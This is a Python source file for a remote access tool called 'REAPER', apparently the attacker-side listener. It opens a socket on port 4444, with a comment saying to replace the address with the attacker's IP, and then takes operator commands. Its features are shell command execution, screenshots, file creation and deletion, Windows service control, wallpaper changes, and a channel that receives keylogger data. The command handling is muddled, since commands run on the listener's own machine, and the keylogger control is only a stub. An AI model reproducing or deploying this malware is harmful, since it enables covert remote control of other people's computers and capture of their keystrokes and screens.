import socket
import os
import subprocess
import ctypes
from PIL import ImageGrab

# ASCII art for the word "REAPER"
def print_ascii_art():
    ascii_art = """
                                                                      
                                                                      
 $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\ 
$$  __$$\ $$  __$$\  \____$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|
$$ |  \__|$$$$$$$$ | $$$$$$$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /      
$$ |      $$   ____|$$  __$$ |$$ |  $$ | \____$$\ $$   ____|$$ |      
$$ |      \$$$$$$$\ \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ 
\__|       \_______| \_______|$$  ____/ \_______/  \_______| \_______|
                              $$ |                                    
                              $$ |                                    
                              \__|                                    
    """
    print(ascii_art)

# Display available commands
def print_commands():
    commands = """
Available Commands:
1. execute_command*<command> - run a powershell command
2. take_screenshot - take a flick 
3. list_files*<directory> - run the dir filelist
4. change_wallpaper*<path> - change wallpaper
5. create_file*<file_path>*<content> - create a file
6. delete_file*<file_path> - reap a file
7. start_service*<service_name> - startup a windows service
8. stop_service*<service_name> - reap a [running] windows service
9. control_keylogger*<action> - Starts or stops the keylogger (action: start/stop)
10. exit - Exits the listener.
"""
    print(commands)

# Execute shell command
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e}"

# Take a screenshot
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", 'rb') as file:
            screenshot_data = file.read()
        os.remove("screenshot.png")
        return screenshot_data
    except Exception as e:
        return f"Failed to take screenshot: {e}"

# List files in a directory
def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except Exception as e:
        return f"Failed to list files: {e}"

# Change desktop wallpaper
def change_wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "Wallpaper changed."
    except Exception as e:
        return f"Failed to change wallpaper: {e}"

# Create a file
def create_file(file_path, content):
    try:
        with open(file_path, 'w') as file:
            file.write(content)
        return "File created."
    except Exception as e:
        return f"Failed to create file: {e}"

# Delete a file
def delete_file(file_path):
    try:
        os.remove(file_path)
        return "File deleted."
    except Exception as e:
        return f"Failed to delete file: {e}"

# Start a service
def start_service(service_name):
    try:
        os.system(f"net start {service_name}")
        return f"Service {service_name} started."
    except Exception as e:
        return f"Failed to start service: {e}"

# Stop a service
def stop_service(service_name):
    try:
        os.system(f"net stop {service_name}")
        return f"Service {service_name} stopped."
    except Exception as e:
        return f"Failed to stop service: {e}"

# Control the keylogger
def control_keylogger(action):
    try:
        if action == "start":
            return "Starting keylogger..."  # Implement communication to start keylogger if needed
        elif action == "stop":
            return "Stopping keylogger..."  # Implement communication to stop keylogger if needed
        else:
            return "Invalid keylogger action."
    except Exception as e:
        return f"Failed to control keylogger: {e}"

# Main listening function
def listen():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("192.168.1.158", 4444))  # Replace with attacker's IP and port
    listener.listen(5)
    print("[*] reaping the net...")
    connection, address = listener.accept()
    print(f"[*] reaped {address}")

    # Display ASCII art and available commands
    print_ascii_art()
    print_commands()

    while True:
        command = input("Enter command: ")
        if command == "exit":
            connection.send(command.encode())
            break
        parts = command.split("*")
        cmd = parts[0]
        args = parts[1:] if len(parts) > 1 else []

        if cmd == "execute_command":
            response = execute_command(" ".join(args))
        elif cmd == "take_screenshot":
            response = take_screenshot()
            connection.send(response)
            continue
        elif cmd == "list_files":
            response = list_files(args[0])
        elif cmd == "change_wallpaper":
            response = change_wallpaper(args[0])
        elif cmd == "create_file":
            response = create_file(args[0], "*".join(args[1:]))
        elif cmd == "delete_file":
            response = delete_file(args[0])
        elif cmd == "start_service":
            response = start_service(args[0])
        elif cmd == "stop_service":
            response = stop_service(args[0])
        elif cmd == "control_keylogger":
            response = control_keylogger(args[0])
        else:
            response = "Unknown command."

        connection.send(response.encode())

        # Check for incoming data from keylogger
        try:
            keylogger_data = connection.recv(1024).decode()
            if keylogger_data:
                print(f"Keylogger data received: {keylogger_data}")
        except socket.error as e:
            print(f"Socket error: {e}")

    connection.close()

if __name__ == "__main__":
    listen()
